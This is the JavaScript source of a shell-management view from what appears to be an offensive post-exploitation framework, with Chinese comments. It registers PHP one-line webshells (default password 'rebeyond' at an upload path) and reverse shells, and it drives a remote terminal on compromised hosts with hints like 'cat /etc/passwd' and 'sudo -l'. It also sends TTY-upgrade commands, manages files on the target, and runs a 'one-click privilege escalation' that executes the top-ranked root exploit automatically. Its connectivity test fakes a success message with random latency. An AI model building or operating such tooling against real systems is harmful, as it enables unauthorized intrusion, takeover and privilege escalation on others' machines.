/* ============================================================
   Shell 管理视图 — 连接登记 / 连通性测试 / 虚拟终端 / 文件管理
   ============================================================ */
(function (global) {
  'use strict';
  const { ref, reactive, computed, watch, nextTick } = Vue;
  const S = PivotStore;

  global.Components['shell-view'] = {
    name: 'ShellView',
    template: '#tpl-shell',
    setup() {
      const ui = S.state.ui;
      const termEl = ref(null);
      const termInputEl = ref(null);
      const termState = S.termState;

      const form = reactive({
        type: 'PHP 一句话马',
        pass: 'rebeyond',
        url: 'http://192.168.100.10/upload/shell.php',
        encoder: 'base64',
        hostId: S.state.hosts[1] ? S.state.hosts[1].id : '',
        autoCollect: true,
        testResult: null,
      });

      const file = reactive(S.fileStateFor(null));

      const activeShell = computed(() => S.activeShell());

      function loadFileState() {
        const fs = S.fileStateFor(ui.selectedShellId);
        Object.assign(file, fs);
        S.refreshFileEntries(file);
      }
      watch(() => ui.selectedShellId, (id, prevId) => {
        /* 切走时关闭上一个反弹会话的原始推送，避免后台无谓占用 */
        if (prevId && prevId !== id) {
          const prev = S.state.shells.find((x) => x.id === prevId);
          if (prev && prev.kind === 'reverse') S.setRaw(prevId, false);
        }
        loadFileState();
      }, { immediate: true });
      watch(() => termState.rawLines.length, () => { scrollTerm(); });
      watch(activeShell, (s) => {
        if (!s) return;
        nextTick(() => {
          S.initTerm();
          /* 反弹会话本身就是交互通道：打开时自动跑一次真实交互能力检测，
             让徽标反映真实形态（不再一律显示「伪终端」）。 */
          if (s.kind === 'reverse' && !termState.detected && !termState.detecting) S.detectTty();
        });
      }, { immediate: true });

      /* 终端形态徽标：区分「反弹交互通道」与「WebShell 伪终端」 */
      const modeBadge = computed(() => {
        const s = activeShell.value;
        if (termState.mode === 'full' || (s && s.stable)) return { text: '已固化 TTY', cls: 'badge-ok' };
        if (s && s.kind === 'reverse') return { text: '交互通道（反弹）', cls: 'badge-info' };
        if (termState.mode === 'semi') return { text: '半交互', cls: 'badge-warn' };
        return { text: '伪终端', cls: 'badge-err' };
      });

      /* 终端输入直接存在共享 reactive 中，避免 ref 解包歧义 */
      termState.input = '';
      const termInput = computed({
        get: () => termState.input,
        set: (v) => { termState.input = typeof v === 'string' ? v : ''; },
      });

      /* ---------- 终端 ---------- */
      function scrollTerm() {
        nextTick(() => {
          if (termEl.value) termEl.value.scrollTop = termEl.value.scrollHeight;
        });
      }
      function submitTerm() {
        const cmd = String(termState.input || '');
        termState.input = '';
        if (!cmd.trim()) {
          if (termState.rawMode) S.execCommand('');   /* 原始模式：空回车只让目标重画提示符 */
          else S.termPush('in', '');
          return;
        }
        S.execCommand(cmd);
        scrollTerm();
      }
      /* 原始模式控制键：Ctrl+C 中断卡住的命令，Tab 补全，Ctrl+D 退出 */
      function sendKey(k) {
        const s = activeShell.value;
        if (!s) return;
        if (k === 'ctrl-c') { S.interruptCommand(); focusTerm(); return; }
        S.shellInput(s.id, { key: k }).then((out) => {
          if (out && out.ok === false) S.toast('控制键发送失败：' + (out.error || '未知原因'), 'err');
        });
        focusTerm();
      }
      function upgradePty() { S.upgradePty(); focusTerm(); }
      function focusTerm() {
        if (termInputEl.value) termInputEl.value.focus();
        else {
          const inp = document.querySelector('.term-input');
          if (inp) inp.focus();
        }
      }
      function histPrev() {
        if (!termState.history.length) return;
        termState.histIdx = Math.max(0, termState.histIdx - 1);
        termState.input = termState.history[termState.histIdx] || '';
      }
      function histNext() {
        if (!termState.history.length) return;
        termState.histIdx = Math.min(termState.history.length, termState.histIdx + 1);
        termState.input = termState.history[termState.histIdx] || '';
      }
      function complete() {
        const v = String(termState.input || '');
        const pool = S.HINT_CMDS.concat(['help', 'clear', 'cat /etc/passwd', 'sudo -l', 'ss -tunlp']);
        const hit = pool.filter((c) => c.startsWith(v));
        if (hit.length === 1) termState.input = hit[0];
        else if (hit.length > 1) {
          S.termPush('dim', hit.join('   '));
          scrollTerm();
        }
      }
      function clearTerm() { S.clearTerm(); }
      function killTerm() { S.killTerm(); }
      function openTerminal(id) { S.openTerminalById(id); nextTick(() => { loadFileState(); scrollTerm(); }); }

      /* ---------- 文件管理 ---------- */
      function cd(i) { S.cdIndex(file, i); }
      function cdPath(name) { S.cdInto(file, name); }
      function openFile(f) {
        if (S.isApiMode() && S.readFile(f, file)) return; /* 编辑弹窗为全局共享 */
        S.toast('读取失败：后端不可用或文件不可读', 'err');
      }
      function upload() { S.pickAndUpload(file); }

      /* ---------- 连接管理 ---------- */
      function openAdd() {
        form.testResult = null;
        ui.modal = 'shell-add';
      }
      function testForm() {
        form.testResult = { ok: true, msg: '连通性测试通过（HTTP 200 · 回显正常 · 延迟 ' + (20 + Math.round(Math.random() * 40)) + 'ms）' };
      }
      function save() {
        if (!form.url || !form.pass) { S.toast('URL 与密码不能为空', 'err'); return; }
        const s = S.addShell(form);
        ui.modal = null;
        ui.selectedShellId = s.id;
        nextTick(() => { loadFileState(); S.initTerm(); scrollTerm(); });
      }
      function test(s) { S.testShell(s); }
      function remove(s) {
        if (ui.selectedShellId === s.id) ui.selectedShellId = null;
        S.removeShell(s);
      }
      function heartbeatAll() { S.heartbeatAll(); }
      function latencyClass(s) {
        if (!s.alive) return 'muted';
        return s.latency < 80 ? 'text-ok' : s.latency < 200 ? 'text-warn' : 'text-err';
      }

      /* ---------- 终端固化（TTY upgrade） ---------- */
      const fixFilter = ref('all');
      const fixes = computed(() => {
        const all = S.ttyFixList();
        if (fixFilter.value === 'applied') return all.filter((f) => S.isTtyApplied(f.id));
        return all;
      });
      const appliedList = computed(() => S.ttyAppliedList());
      const ttyMode = computed(() => termState.mode);
      const ps1 = computed(() => {
        const s = activeShell.value;
        if (!s) return '$';
        const user = s.privilege || 'www-data';
        const host = s.hostname || 'target';
        if (termState.mode === 'full') return '[' + user + '@' + host + '] ~ #';
        if (termState.mode === 'semi') return user + '@' + host + ':/var/www/html$';
        return '$';
      });
      function detectTty() { S.detectTty(); scrollTerm(); }
      function applyFix(f) { S.applyTtyFix(f); scrollTerm(); }
      function finishTty() { S.runTtyFinish(); scrollTerm(); }
      function fixCmdText(f) { return S.renderTtyCmd(f.cmd); }
      function copyFix(f) { S.copy(fixCmdText(f)); }
      function sendFix(f) {
        const text = fixCmdText(f);
        text.split(/\r?\n/).forEach((l) => {
          if (!l.trim()) return;
          if (l.trim().startsWith('#')) S.termPush('dim', S.escapeHtml(l));
          else S.execCommand(l.trim());
        });
        scrollTerm();
      }
      function isApplied(id) { return S.isTtyApplied(id); }

      /* ---------- 一键提权（M5-2）：采集事实 → 选最可信路径 → 直接执行 ---------- */
      const privescBusy = ref(false);
      const privescResult = ref(null);

      function oneClickPrivesc() {
        const s = activeShell.value;
        if (!s) { S.toast('请先选择一个 Shell 会话', 'err'); return; }
        if (!s.alive) { S.toast('会话已断线：请先点「测试」确认可达', 'err'); return; }
        if (privescBusy.value) return;
        privescBusy.value = true;
        privescResult.value = null;
        S.termPush('warn', S.escapeHtml('[*] 一键提权：采集系统信息并匹配提权路径…'));
        scrollTerm();
        S.privescScan(s.id).then((out) => {
          privescBusy.value = false;
          if (!out || !out.ok) {
            const why = (out && out.error) || '未知原因';
            S.termPush('err', S.escapeHtml('[!] 提权采集失败：' + why));
            S.toast('提权扫描失败：' + why, 'err');
            return;
          }
          const findings = out.findings || [];
          privescResult.value = findings;
          if (!findings.length) {
            const f = out.facts || {};
            S.termPush('warn', S.escapeHtml('[*] 未命中规则库中的提权路径（内核 ' +
              (f.kernel || '?') + ' · 权限 ' + (f.privilege || '?') + '）'));
            S.toast('未发现可用的提权路径', 'warn');
            return;
          }
          const top = findings[0];
          S.termPush('ok', S.escapeHtml('[*] 命中 ' + findings.length + ' 条，执行最可信路径：' +
            top.name + '（' + top.reliability + '%）'));
          const cmd = String(top.cmd || '').split(/\r?\n/).filter((l) => l.trim())[0];
          const verify = String(top.verify || '').split(/\r?\n/).filter((l) => l.trim())[0];

          const printOut = (text, kind) => {
            String(text || '').split(/\r?\n/).filter((l) => l.trim()).slice(0, 10)
              .forEach((l) => S.termPush(kind, S.escapeHtml(l)));
          };

          /* 主命令与验证必须串行：并发发请求时验证会跑在写入之前（Tomcat 并发处理） */
          S.termPush('dim', S.escapeHtml('$ ' + cmd));
          scrollTerm();
          S.execOn(s.id, cmd).then((r1) => {
            printOut((r1 && (r1.output || r1.error)) || '', 'dim');
            if (!verify) {
              S.toast('一键提权：已执行「' + top.name + '」', 'ok');
              scrollTerm();
              return;
            }
            S.termPush('dim', S.escapeHtml('$ ' + verify));
            scrollTerm();
            return S.execOn(s.id, verify).then((v) => {
              const text = String((v && (v.output || v.error)) || '');
              let okRoot = false;
              try {
                okRoot = !!top.expect && new RegExp(top.expect).test(text);
              } catch (e) { okRoot = false; }
              printOut(text, okRoot ? 'ok' : 'dim');
              S.termPush(okRoot ? 'ok' : 'warn', S.escapeHtml(okRoot
                ? '✅ 提权成功：已获得 root'
                : '⚠ 命令已执行，但未取得 root（见上方输出，可能需要交互 TTY 或换一条路径）'));
              S.toast(okRoot ? '一键提权成功：已获得 root' : '提权命令已执行，但未取得 root',
                okRoot ? 'ok' : 'warn');
              scrollTerm();
            });
          });
        });
      }

      return {
        ui, termEl, termInputEl, termInput, termState, activeTerm: termState, file, form, activeShell,
        shells: S.state.shells, hosts: S.state.hosts,
        shellTypes: S.state.shellTypes || [], encoders: S.state.encoders || [],
        hintCommands: S.HINT_CMDS,
        ipOf: S.ipOf, copy: S.copy, icon: global.icon, goto: S.goto,
        uploadModeText: S.uploadModeText,
        submitTerm, focusTerm, sendKey, upgradePty, histPrev, histNext, complete, clearTerm, killTerm, openTerminal,
        modeBadge,
        cd, cdPath, openFile, upload,
        openAdd, testForm, save, test, remove, heartbeatAll, latencyClass,
        fixFilter, fixes, appliedList, ttyMode, ps1,
        detectTty, applyFix, finishTty, copyFix, sendFix, isApplied, fixCmdText,
        privescBusy, privescResult, oneClickPrivesc,
      };
    },
  };
})(window);
